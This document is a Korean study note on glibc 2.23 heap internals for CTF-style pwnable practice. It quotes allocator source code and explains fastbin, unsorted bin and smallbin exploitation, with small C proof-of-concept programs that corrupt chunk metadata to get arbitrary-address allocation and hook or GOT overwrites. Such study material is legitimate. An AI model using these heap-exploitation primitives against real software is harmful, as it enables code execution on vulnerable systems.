pwnable_tech
=============
까먹지 않게 적어두자!

# 1. Glibc Heap
런타임시 동적메모리를 사용함에 있어 syscall를 최소화 하기 위하여 libc단에서 동적메모리 관리가 이루어짐.

## 1.1. glibc2.23 (Ubuntu 16.04)
### 1.1.1. malloc()
  동적 메모리 할당 과정 요약
  - call malloc(size)
      - check __malloc_hook
      ```c
      void *(*hook) (size_t, const void *)
          = atomic_forced_read (__malloc_hook);
      if (__builtin_expect (hook != NULL, 0))
          return (*hook)(bytes, RETURN_ADDRESS (0));
      ```
      - call _int_malloc(arena, size)
      
      - 첫 malloc()시 checked_request2size()를 통해 align에 맞게 사이즈 변경하고 sysmalloc() 호출함. 이경우에는 sysmalloc()을 통해 힙주소를 반환받고, 다시 _int_malloc()호출함
      
      ```c
      // 첫 malloc시
      if (__glibc_unlikely (av == NULL))
      {
        void *p = sysmalloc (nb, av);
        if (p != NULL)
    alloc_perturb (p, bytes);
        return p;
      }
      ```
      - bins에서 재할당할만한 chunk가 없고, 요청된 size가 topchunk보다 클 경우 sysmalloc() 호출
      ```c
      // size가 topchunk보다 클경우
        victim = av->top;
        size = chunksize (victim);

        if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
          {
            remainder_size = size - nb;
            remainder = chunk_at_offset (victim, nb);
            av->top = remainder;
            set_head (victim, nb | PREV_INUSE |
                      (av != &main_arena ? NON_MAIN_ARENA : 0));
            set_head (remainder, remainder_size | PREV_INUSE);

            check_malloced_chunk (av, victim, nb);
            void *p = chunk2mem (victim);
            alloc_perturb (p, bytes);
            return p;
          }
        else if (have_fastchunks (av))
          {
            malloc_consolidate (av);
            if (in_smallbin_range (nb))
              idx = smallbin_index (nb);
            else
              idx = largebin_index (nb);
          }
        else
          {
            void *p = sysmalloc (nb, av);
            if (p != NULL)
              alloc_perturb (p, bytes);
            return p;
          }
      ```

      - sysmalloc()에서 arena 상태에 따라 sys_mmap()으로 새로운 새그먼트를 할당해주거나, sbrk로 새그먼트 사이즈 늘림(전자는 요청된 size가 mmap_threshold보다 크거나 첫 malloc()시, 후자는 요청된 size가 topchunk의 크기보다 크고 mmap_threshold보다 작을 경우)

      - 그리고 다음과 같은 순으로 할당해줄 공간을 체크함. (fastbin->smallbin->largebin->unsortedbin->topchunk)
        1. fastbin  
            - global_max_fast 이하 size
            - fastbin index에 맞지 않는 size의 chunk가 bin에 존재할경우 corruption 뜸
            - fastbin은 딱 한가지 상황을 제외하고 병합되지 않음!(largebin size 할당할때는 fastbin도 병합)
        ```c
        if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
              {
                errstr = "malloc(): memory corruption (fast)";
              errout:
                malloc_printerr (check_action, errstr, chunk2mem (victim), av);
                return NULL;
              }
        // fastbin chain관련 제한이 없어서 chunk fd수정할 수 있으면 원하는곳에 할당 가능(fastbin attack) size는 맞춰줘야함!!
        ```
        2. smallbin
            - chain의 끝 청크를 우선적으로 할당 -> 리스트 전체의 체인의 손상 여부를 검사하지 않음 -> (smallbin[idx]->bk)->fd 부분과 (smallbin[idx]->bk)->fd->bk 부분만 원하는 주소로 수정해주면 임의의 위치 할당가능!
            - unlink시 size체크가 없다!
          ```c
          if ((victim = last (bin)) != bin) // smallbin[idx]에 청크가 있을때!
          {
            if (victim == 0) /* initialization check */
                malloc_consolidate (av);
              else
                {
                  bck = victim->bk; 
                  if (__glibc_unlikely (bck->fd != victim))
                  {
                      errstr = "malloc(): smallbin double linked list corrupted";
                      goto errout;
                  }
                  ...
          ```
          3. largebin
              - fastbin / smallbin size에 포함되지 않은 크기의 청크할당시 여기를 뒤짐
              - 이 루틴 타면 인접한 fastbin들 병합됨(병합된 chunk가 요청한 크기로 재할당될수 있으면 재할당되고 안되면 unsorted bin을 거치지 않고 바로 smallbin/largebin으로 분류됨)
              - 이 루틴을 통해 fastbin을 smallbin으로 변환시킬 수 있음. 

          4. unsortedbin
              - 복잡함!
              - fastbin을 제외한 모든 chunk들이 free되면 일단 여기들어감.
              - 여기있는 chunk들은 사이즈에 맞게 재할당될수도 있고, split해서 반환될수도 있음.
              - unsortedbin의 chunk의 fd,bk가 main_arena+88을 가르키는데, 이는 unsortedbin-0x10의 위치임, 모든 bin은 malloc_chunk와 같은 구조를 가지기 때문에 - 0x10만큼 차이가 남!(그래야 bin->fd,bk를 통해 접근이 가능하기 떄문)
              - unsorted bin에서 재할당 과정은 다음과 같음.
                  1. 요청한 size가 smallbin사이즈고, bin에 청크가 하나밖에 없고, 그게 last_remainder chunk이며, split가능한 조건이면? split해서 chunk 돌려주고 나머지는 unsorted bin에 잔류
                ```c
                  if (in_smallbin_range (nb) &&
                  bck == unsorted_chunks (av) &&
                  victim == av->last_remainder &&
                  (unsigned long) (size) > (unsigned long) (nb + MINSIZE))
                {
                  /* split and reattach remainder */
                  remainder_size = size - nb;
                  remainder = chunk_at_offset (victim, nb);
                  unsorted_chunks (av)->bk = unsorted_chunks (av)->fd = remainder;
                  av->last_remainder = remainder;
                  remainder->bk = remainder->fd = unsorted_chunks (av);
                  if (!in_smallbin_range (remainder_size))
                    {
                      remainder->fd_nextsize = NULL;
                      remainder->bk_nextsize = NULL;
                    }

                  set_head (victim, nb | PREV_INUSE |
                            (av != &main_arena ? NON_MAIN_ARENA : 0));
                  set_head (remainder, remainder_size | PREV_INUSE);
                  set_foot (remainder, remainder_size);

                  check_malloced_chunk (av, victim, nb);
                  void *p = chunk2mem (victim);
                  alloc_perturb (p, bytes);
                  return p;
                }
                ```

                  2. a번의 조건이 만족하지 않는 경우, 일단 unsorted bin에서 청크 제거 -> 이과정에서 사이즈나 chain유효 검사가 없어서 unsortedbin attack 발생
                ```c
                while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
                {
                bck = victim->bk;
                ...
                /* remove from unsorted list */
                unsorted_chunks (av)->bk = bck; // 우리가 수정한 bck가 들어가자너!
                bck->fd = unsorted_chunks (av);
                ```
                  3. 이후 b번에서 unsorted bin으로 부터 제거된 chunk는 해당 사이즈에 맞는 bin으로 들어가게됨!(smallbin or largebin // fastbin x)

                  4. a번과정 또는 c번과정을 거치면 unsortedbin의 다음 청크에 대하여 똑같은 루틴 수행

              - unsortedbin attack? unsorted bin의 마지막 chunk의 bk를 수정하여 원하는곳에 main_arena.top주소를 적을 수 있다!
  
          5. top chunk
              - 위의 과정을 거치면서 chunk가 재할당되지 못한경우(_int_malloc에서 return이 안된경우!) top chunk에서 잘라서 반환해준다.
            - top chunk 사이즈가 모자라면? sysmalloc() 호출!

  참고 - malloc_chunk 구조체
  ```c
  struct malloc_chunk {
    INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
    INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */
    struct malloc_chunk* fd;         /* double links -- used only if free. */
    struct malloc_chunk* bk;
    /* Only used for large blocks: pointer to next larger size.  */
    struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
    struct malloc_chunk* bk_nextsize;
  };
  ```
### 1.1.2. free()
  메모리 해제 과정 요약
  - __free_hook check
  - mmaped_memory이면(세그먼트 단위의 큰 size이 메모리 공간) munmap_chunk으로 바로 메모리 회수
  - 그 외에는 _int_free()호출 -> 내부에서 size와 address 검사
  - _int_free에서 arena의 mutext필드에 따라 mutex_lock호출 (mutext_lock는 vtable로 존재하는 걸로 추정)
  - free될 메모리 사이즈가 fastbin size면 fastbin으로 그 이외에는 unsorted bin으로!
  - 각 bin별로 double free 체크 루틴 존재
  - fastbin만 쓸모 있음
  ```c
  // 가장 최근에 free된 chunk(fastbin[idx] head에 적힌 chunk)와 같지만 않으면 됨!
  do
      {
	/* Check that the top of the bin is not the record we are going to add
	   (i.e., double free).  */
	if (__builtin_expect (old == p, 0))
	  {
	    errstr = "double free or corruption (fasttop)";
	    goto errout;
	  }
  ```
  - unsorted bin은 다음 chunk의 prev_inuse bit를 이용해서 double free check

  - 끝! free는 별거 없당
  

### 1.1.3. bins
  - main_arena를 포함한 arena들은 malloc_state 구조체로 이루어짐
  - unsortedbin, smallbin, largebin은 bins[]라는 배열로 관리됨.
  - bins는 malloc_chunk와 같은 구조를 가짐! fd,bk를 bin의 head와 tail로 이용함
  ```c
  struct malloc_state
  {
    mutex_t mutex;

    int flags;
    mfastbinptr fastbinsY[NFASTBINS];
    mchunkptr top;
    mchunkptr last_remainder;
    mchunkptr bins[NBINS * 2 - 2];
    unsigned int binmap[BINMAPSIZE];
    struct malloc_state *next;
    struct malloc_state *next_free;
    INTERNAL_SIZE_T attached_threads;
    INTERNAL_SIZE_T system_mem;
    INTERNAL_SIZE_T max_system_mem;
  };
  ```  

## 1.2. glibc2.27 (Ubuntu 18.04) 
- tcache라는 녀석이 추가됨
- tache는 fastbin과 유사하며(single linked list) 모든 size의 chunk들이 여기에 들어감
- size 체크 없음. fd 수정가능하면 임의의 위치 할당받을 수 있음
- 개꿀.. 분석은 다음기회에~


## 1.3. exploit
### 1.3.1. fastbin을 이용한 테크닉
  - fastbin double free
    1. dobule free검사 로직이 단순해서 쉽게 dobule free 가능(연속으로 같은 chunk만 free 안하면 ok)
    2. 이를 통해 여러 포인터가 같은 chunk를 가르키게 할 수 있음

  - fastbin attack
    1. double free를 이용하든, uninitialzied pointer를 이용하든 fastbin chunk의 fd를 조작하면 임의의 공간을 할당받을 수 있음
    2. 주의사항 - fastbin로 부터 재할당시 size check가 있음. __malloc_hook이나 got에 libc base의 최 상위 바이트인 0x7f를 이용하여 size check 우회
    3. fastbin attack을 통해 got나 __malloc_hook, vtable과 같은 공간을 할당받고 이를 조작하여 pc컨트롤

### 1.3.2 unsorted bin을 이용한 테크닉
  - libc leak
    1. unsortedbin의 더블링크드 리스트 특성상 첫 청크와 끝 청크의 fd와 bk가 unsorted bin을 가르킴(main_arena+88 == main_arena.top)
    2. uninitialized pointer나 user after free와 같은 취약점을 통해 unsroted bin chunk로 부터 libc를 릭할수 있당.
  
  - unsortedbin dobule free
    1. unsorted bin의 경우 next chunk의 pre_inuse bit를 이용하여 dobule free check
    2. next chunk의 prev_inuse bit를 수정할 수 있으면 dobule free 가능
    3. dobule free를 통해 loop chain을 만들어서 계속 똑같은 공간을 할당받게 할 수 있음.
    ```c
    int main(){

    void *a = malloc(0x100);
    void *b = malloc(0x30);
    free(a);

    // a의 다음 chunk인 b의 prev_inuse bit 수정
    *(long *)(b-0x8) = 0x41;

    // dobule free를 통해 unsorted bin의 loop chain 생성
    free(a);

    // 이후 unsorted bin으로 부터 할당되는 공간은 모두 a와 같음
    malloc(0x100);
    malloc(0x100);
    malloc(0x100);
    }
    ```

  - unsortedbin attack
    1. unsortedbin의 bk를 임의의 주소로 수정하고 unlink시킴으로서 임의의 주소에 main_arena+88 주소를 적을 수 있음
    2. input_size와 같은 global 변수를 덮을 수 있으면 overflow 유도가능
    3. 또, unlink시 unsortedbin->bk부분에 임의의 주소가 적힘.
    4. global 변수에 unsorted bin unlink시 검사하는 size check를 우회할 수 있도록 만들어 놓고, unsorted bin chunk의 bk를 수정할수 있으면 임의의 위치에 chunk할당 가능(써먹을 수 있을까..)
    ```c
    // unsorted bin attack으로 임의 주소 할당받기 poc
    #include<stdlib.h>
    char buf[0x100];

    int main(){
    void *a = malloc(0x100);
    void *a1 = malloc(0x10);
    free(a);

    // 할당받고자 하는 주소(buf)로 unsortedbin chunk bk 변경
    *(long *)(a+0x8) = (long )&buf;

    // buf->size 부분이 unsorted bin에 해당하는 사이즈여야함.
    *(long *)(buf+0x8) = 0x111;

    // unlink시 레퍼런스 에러가 발생안하도록 buf->bk에 사용할수 있는 아무 주소 적기.
    *(long *)(buf+0x18) = (long )&buf+0x30;

    // unsorted bin attack를 트리거하여 unsortedbin->bk를 buf의 주소로수정
    void *b = malloc(0x100);

    // 이후 unsroted bin에서 할당되는 녀석은? buf+0x10
    void *b1 = malloc(0x100);
    }
    ```
    5. 4번 방법을 통하여 중요한 오브젝트를 내가 원하는곳에 할당할 수 있도록할 수 있음. -> 내가 수정할수 있는 곳이면? 오브젝트 컨트롤 가능!
    6. unsorted bin attack으로 File stream pointer를 main_arena+88로 overwrite하여 House of Orange 트리거 가능.

### 1.3.3 small bin을 이용한 테크닉
  - libc leak
    1. unsortedbin 처럼 더블링크드 리스트로 이루어져있어 main_arena.smallbin[idx] 주소를 릭할 수 있음.

  - smallbin attack
    1. chain의 끝 청크를 우선적으로 할당
    2. 리스트 전체의 체인의 손상 여부를 검사하지 않음 
    3. unlink를 이용하여 (smallbin[idx]->bk)->fd 부분과 (smallbin[idx]->bk)->fd->bk 부분만 원하는 주소로 수정해주면 임의의 위치 할당가능!
    4. unlink시 size체크가 없어 쉽게 트리거 가능
    5. but..! 3번 행위를 하기 위해서 최소 같은 idx의 smallbin chunk가 필요함.
    ```c
    char buf[0x100];
    int main(){

    void *a = malloc(0x100);
    malloc(0x30);
    void *a1 = malloc(0x100);
    malloc(0x30);

    free(a);
    free(a1);

    // unlink시 ((smallbin[idx]->bk)->bk)->fd == (smallbin[idx]->bk) 검사함
    // 이부분을 수정하면 원하는 위치에 할당가능
    void *b = malloc(0x300);
    *(long *)(a+8) = (long )&buf;
    *(long *)(a) = (long )&buf;
    *(long *)(buf+0x10) = (long )a-0x10;
    *(long *)(buf+0x18) = (long )a-0x10;

    void *c = malloc(0x100);
    // buf+16부분 할당됌.
    void *c1 = malloc(0x100);
    }
    ```
    